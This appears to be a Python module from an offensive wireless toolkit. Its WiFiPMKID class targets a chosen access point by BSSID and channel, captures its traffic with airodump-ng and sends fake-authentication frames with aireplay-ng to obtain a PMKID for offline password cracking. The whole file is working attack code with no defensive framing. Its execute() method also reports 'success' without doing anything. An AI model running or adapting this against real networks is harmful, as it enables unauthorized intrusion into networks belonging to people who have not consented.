import subprocess
import os
import logging
import time
import signal
import threading

from logger import Logger
logger = Logger(name="wifi_pmkid.py", level=logging.DEBUG)
b_class = "WiFiPMKID"
b_module = "wifi_pmkid"
b_status = "wifi_pmkid"
b_port = 0
b_parent = None


class WiFiPMKID:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.mon_iface = shared_data.config.get("monitor_interface", "wlan0mon")
        self.capture_process = None
        self.assoc_process = None
        self.pmkid_dir = os.path.join(shared_data.datadir, "pmkid")
        self.running = False

    def start(self, bssid, channel, prefix=None):
        return self.start_capture(bssid, channel, prefix)

    def start_capture(self, bssid, channel, output_file=None):
        try:
            import re
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                raise ValueError("Invalid BSSID format")
            channel_int = int(channel)
            if channel_int < 1 or channel_int > 165:
                raise ValueError("Channel must be between 1 and 165")
            os.makedirs(self.pmkid_dir, exist_ok=True)
            if not output_file:
                output_file = os.path.join(self.pmkid_dir, f"pmkid_{bssid.replace(':', '')}_{int(time.time())}")
            subprocess.run(['sudo', 'iwconfig', self.mon_iface, 'channel', str(channel)], capture_output=True, timeout=5, check=False)
            cmd = [
                'sudo', 'airodump-ng', '-c', str(channel),
                '--bssid', bssid,
                '-w', output_file,
                '--output-format', 'pcap,csv',
                self.mon_iface
            ]
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            fakeauth_interval = str(self.shared_data.config.get("evil_ap_fakeauth_interval", 30))
            assoc_cmd = ['sudo', 'aireplay-ng', '--fakeauth', fakeauth_interval, '-a', bssid, self.mon_iface]
            self.assoc_process = subprocess.Popen(assoc_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.running = True
            logger.info(f"PMKID capture + fakeauth started for {bssid} on channel {channel}")
            return output_file
        except Exception as e:
            logger.error(f"Failed to start PMKID capture: {e}")
            return None

    def stop(self):
        return self.stop_capture()

    def stop_capture(self):
        self.running = False
        for proc in [getattr(self, 'assoc_process', None), getattr(self, 'capture_process', None)]:
            if proc:
                try:
                    proc.send_signal(signal.SIGINT)
                    proc.wait(timeout=5)
                except:
                    try:
                        proc.kill()
                    except:
                        pass
        self.capture_process = None
        self.assoc_process = None
        logger.info("PMKID capture stopped")
        return True

    def execute(self, ip="", port="", row=None, status_key=""):
        return 'success'
